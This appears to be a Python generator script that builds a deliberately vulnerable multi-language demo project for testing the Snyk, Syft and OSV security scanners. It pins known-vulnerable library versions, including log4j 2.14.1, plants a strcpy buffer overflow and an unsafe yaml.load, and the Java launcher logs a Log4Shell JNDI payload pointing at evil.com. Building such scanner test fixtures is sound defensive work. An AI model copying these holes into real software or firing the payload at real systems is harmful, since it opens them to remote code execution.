import os
import stat

# Creates a file at the given path with the given content.
def create_file(path, content):
    # Create the directory if it doesn't exist.
    os.makedirs(os.path.dirname(path), exist_ok=True)
    # Open the file in write mode and write the content.
    with open(path, 'w') as f:
        f.write(content)
    # Print a message indicating that the file was created.
    print(f"Created: {path}")

# Makes a file executable.
def make_executable(path):
    # Get the current file status.
    st = os.stat(path)
    # Add the executable permission to the file mode.
    os.chmod(path, st.st_mode | stat.S_IEXEC)

# --- Project Configuration ---

# Base directory for the generated project.
BASE_DIR = "minidroid-platform"

# --- 1. JAVA (Android Framework/Apps) ---
# This section defines the files for a sample Java-based Android application.
# It includes a vulnerable version of Log4j to simulate a security risk.

# The pom.xml file for the Java application, including vulnerable dependencies.
pom_xml = """<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.minidroid</groupId>
  <artifactId>minidroid-launcher</artifactId>
  <packaging>jar</packaging>
  <version>1.0-SNAPSHOT</version>
  <name>MiniDroid Launcher</name>
  <dependencies>
    <!-- VULNERABILITY: Log4Shell (CVE-2021-44228) -->
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>
    </dependency>
    <!-- VULNERABILITY: Old Jackson Databind -->
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.9.8</version>
    </dependency>
  </dependencies>
</project>
"""

# The Java source code for the launcher application.
java_src = """package com.minidroid.launcher;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Launcher {
    private static final Logger logger = LogManager.getLogger(Launcher.class);

    public static void main(String[] args) {
        // Simulating usage of the vulnerable logger
        String userInput = "${jndi:ldap://evil.com/exploit}";
        logger.error("User input: " + userInput); 
        System.out.println("MiniDroid Launcher Started...");
    }
}
"""

# --- 2. PYTHON (Tooling/Scripts) ---
# This section defines files for Python-based tools and scripts.
# It includes a requirements file with old and potentially vulnerable libraries.

# The requirements.txt file for the Python tools.
requirements_txt = """requests==2.19.0
pyyaml==5.3.1
flask==0.12
"""

# The Python source code for a system tool.
python_src = """import requests
import yaml

def parse_config(config_str):
    # Potential unsafe load if not careful, though Snyk checks dependencies primarily here
    return yaml.load(config_str, Loader=yaml.Loader)

def fetch_update():
    # Old requests library
    r = requests.get('http://insecure-update-server.local')
    print(r.status_code)

if __name__ == "__main__":
    print("System Config Tool Running")
"""

# --- 3. C++ (Native System Server) ---
# This section defines files for a native C++ system service.
# It includes a buffer overflow vulnerability.

# The C++ source code for a native service.
cpp_src = """#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void process_input(char *input) {
    char buffer[50];
    // SAST VULNERABILITY: Buffer Overflow (CWE-120)
    // Snyk Code should catch this.
    strcpy(buffer, input); 
    printf("Processed: %s\\n", buffer);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        process_input(argv[1]);
    } else {
        printf("Minidroid Native Service. Waiting for input...\\n");
    }
    return 0;
}
"""

# The Makefile for the C++ native service.
make_file = """all:
	mkdir -p ../../out/target/product/generic/system/bin
	gcc native_service.c -o ../../out/target/product/generic/system/bin/native_service
"""

# --- 4. GO (Microservices) ---
# This section defines files for a Go-based microservice.
# It includes a go.mod file with a vulnerable crypto library.

# The go.mod file for the Go microservice.
go_mod = """module github.com/minidroid/netdaemon

go 1.16

require (
	golang.org/x/crypto v0.0.0-20200622213623-75b288015ac9
	github.com/gin-gonic/gin v1.6.3
)
"""

# The Go source code for the microservice.
go_src = """package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	r.GET("/ping", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "pong",
		})
	})
	fmt.Println("NetDaemon starting...")
	// r.Run() // Commented out to prevent blocking build
}
"""

# --- 5. RUST (Secure Component) ---
# This section defines files for a Rust-based secure component.
# It includes a Cargo.toml file with an old dependency.

# The Cargo.toml file for the Rust component.
cargo_toml = """[package]
name = "secure-enclave"
version = "0.1.0"
edition = "2018"

[dependencies]
# Old OpenSSL
openssl = "0.10.30"
"""

# The Rust source code for the secure component.
rust_src = """fn main() {
    println!("Secure Enclave Initialized.");
}
"""

# --- BUILD SCRIPT ---
# This section defines the build script for the project.
build_script = """#!/bin/bash

# Simulating an Android Build System (envsetup.sh + make)
echo "[*] Initializing MiniDroid Build Environment..."

# Define Output Directories (Mimicking AOSP)
OUT_DIR="out/target/product/generic"
SYSTEM_DIR="$OUT_DIR/system"
VENDOR_DIR="$OUT_DIR/vendor"

mkdir -p $SYSTEM_DIR/bin
mkdir -p $SYSTEM_DIR/framework
mkdir -p $SYSTEM_DIR/app
mkdir -p $SYSTEM_DIR/etc
mkdir -p $VENDOR_DIR/lib64

echo "[*] Building Native Layers (C/C++)..."
# Compile the C binary (Mocking Make)
if command -v gcc &> /dev/null; then
    gcc system/core/native_service.c -o $SYSTEM_DIR/bin/native_service
    echo "    - Built system/bin/native_service"
else
    echo "    - GCC not found. Creating dummy binary."
    touch $SYSTEM_DIR/bin/native_service
fi

echo "[*] Building Java Frameworks..."
# In real life, we would run 'mvn package'. Here we mimic the artifact.
# We copy the pom.xml to the output so Syft can find it in the 'image'
cp packages/apps/Launcher/pom.xml $SYSTEM_DIR/framework/launcher-meta.xml
echo "    - Installed launcher artifacts to system/framework"

echo "[*] Installing Python Tools..."
# Copying python requirements so directory scanners find them
cp system/tools/requirements.txt $SYSTEM_DIR/etc/sys_tool_requirements.txt
cp system/tools/sys_tool.py $SYSTEM_DIR/bin/sys_tool.py
echo "    - Installed system tools"

echo "[*] Building Go Microservices..."
# Copying go.mod to output for scanner visibility
cp vendor/components/netdaemon/go.mod $SYSTEM_DIR/bin/netdaemon.go.mod
echo "    - Installed Go daemon metadata"

echo "[*] Build Complete."
echo "    Artifacts located in: $OUT_DIR"
"""

# --- README ---
# This section defines the content for the README.md file.
readme_md = """# MiniDroid Platform - Security Scan Demo

This project mimics a simplified Android/Embedded build structure to test **Snyk**, **Syft**, and **OSV-Scalibr**.

## Directory Structure
- `system/core`: Native C++ services.
- `packages/apps`: Java/Kotlin applications.
- `vendor/components`: Go/Rust microservices.
- `system/tools`: Python system utilities.
- `out/`: The simulated "Build Artifact" (Target for Syft/OSV).

## Quick Start

1. **Simulate the Build**
   Run the build script to generate the filesystem artifacts in `out/`:
   ```bash
   ./build_system.sh
   ```

2. **Scan Step 1: Static Analysis (Snyk Code)**
   Scan the source code for logic flaws (like the buffer overflow in C++).
   ```bash
   snyk code test
   ```

3. **Scan Step 2: Generate SBOM (Syft)**
   Scan the "built" image (the `out` directory) to see what ended up in the final OS.
   ```bash
   # Make sure you have syft installed
   syft dir:./out/target/product/generic/system -o cyclonedx-json --file minidroid.sbom.json
   ```

4. **Scan Step 3: Vulnerability Scan (OSV & Snyk)**
   
   **Option A: OSV-Scanner**
   ```bash
   osv-scanner --sbom minidroid.sbom.json
   ```

   **Option B: Snyk Open Source (via SBOM)**
   ```bash
   snyk sbom test --file=minidroid.sbom.json
   ```
"""

# --- GENERATION EXECUTION ---
# This section creates the files and directories for the project.

# Create files for the Java application.
create_file(f"{BASE_DIR}/packages/apps/Launcher/pom.xml", pom_xml)
create_file(f"{BASE_DIR}/packages/apps/Launcher/src/main/java/com/minidroid/launcher/Launcher.java", java_src)

# Create files for the Python tools.
create_file(f"{BASE_DIR}/system/tools/requirements.txt", requirements_txt)
create_file(f"{BASE_DIR}/system/tools/sys_tool.py", python_src)

# Create files for the C++ native service.
create_file(f"{BASE_DIR}/system/core/native_service.c", cpp_src)
create_file(f"{BASE_DIR}/system/core/Makefile", make_file)

# Create files for the Go microservice.
create_file(f"{BASE_DIR}/vendor/components/netdaemon/go.mod", go_mod)
create_file(f"{BASE_DIR}/vendor/components/netdaemon/main.go", go_src)

# Create files for the Rust component.
create_file(f"{BASE_DIR}/vendor/components/secure_enclave/Cargo.toml", cargo_toml)
create_file(f"{BASE_DIR}/vendor/components/secure_enclave/src/main.rs", rust_src)

# Create the build script and README file.
create_file(f"{BASE_DIR}/build_system.sh", build_script)
make_executable(f"{BASE_DIR}/build_system.sh")
create_file(f"{BASE_DIR}/README.md", readme_md)

# Print a success message.
print("\n[SUCCESS] Project 'minidroid-platform' generated.")
print("Run 'cd minidroid-platform && ./build_system.sh' to start.")
